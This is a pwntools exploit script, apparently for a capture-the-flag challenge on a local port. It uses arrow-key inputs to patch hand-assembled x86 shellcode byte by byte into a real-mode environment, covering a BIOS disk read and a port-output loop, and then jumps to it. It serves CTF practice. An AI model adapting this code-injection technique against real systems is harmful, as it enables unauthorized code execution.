from pwn import *
from time import sleep
# elf = ELF("")
# context.log_level = "debug"
context.arch = 'x86_64'
# utils
# r = process("./run.sh", shell=True)
r = remote("localhost", 1338)


def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def up(): return s(b'\x1b[A')
def down(): return s(b'\x1b[B')
def enter(): return s(b'\n')
# sleep(2)
pause()
# for i in range(12):
#     # decrement the \x7d by 1 every time
#     s((0x7d-i).to_bytes(1,"little"))
#     up()
# sec2 = "b402b001b500b600b102bb007eb280cd13"

###

###
sec2 = "B402B001B500B600B10266BB007EB280CD13"
sec2_bytes = [int(sec2[i:i+2], 16) for i in range(0, len(sec2), 2)]

# nullb = "0000000000fa31c08ed88ec08ed0bcfffffb"

nullb = "909090909090909090909090909090909090"
nullb_bytes = [int(nullb[i:i+2], 16) for i in range(0, len(nullb), 2)]

# s((0x100).to_bytes(2,"little"))
# up()

j = 0
for i in range(18):
    print(f"byte {i}")
    if sec2_bytes[j] < nullb_bytes[j]:
        for k in range(nullb_bytes[j] - sec2_bytes[j]):
            # print(nullb_bytes[j] - sec2_bytes[j], k)
            sleep(0.07)
            s((i+1).to_bytes(2,"little"))
            sleep(0.07)
            down()
            
    elif sec2_bytes[j] > nullb_bytes[j]:
        for k in range(sec2_bytes[j] - nullb_bytes[j]):
            # print(sec2_bytes[j] - nullb_bytes[j], k)
            sleep(0.07)
            s((i+1).to_bytes(2,"little"))
            sleep(0.07)
            up()
    j += 1

# pause()
print("jmping...")
for p in range(201):
    sleep(0.07)
    # print(p)
    s((0x5c+1).to_bytes(1,"little"))
    sleep(0.07)
    down()


# printf = "678A07B40ECD106643EBF5"
printf = "6689DE66BAF803ACEEEBFC"
printfb = [int(printf[i:i+2], 16) for i in range(0, len(printf), 2)]

print("printfing...")
# pause()
j = 0
for i in range(11):
    print(f"byte {i}")
    if printfb[j] < nullb_bytes[j]:
        for k in range(nullb_bytes[j] - printfb[j]):
            sleep(0.07)
            s((i+0x1d+1).to_bytes(2,"little"))
            sleep(0.07)
            down()
            
    elif printfb[j] > nullb_bytes[j]:
        for k in range(printfb[j] - nullb_bytes[j]):
            sleep(0.07)
            s((i+0x1d+1).to_bytes(2,"little"))
            sleep(0.07)
            up()
    j += 1

print("dont forget to set a bkpt")
pause()
s((0x1b).to_bytes(1,"little"))

r.interactive()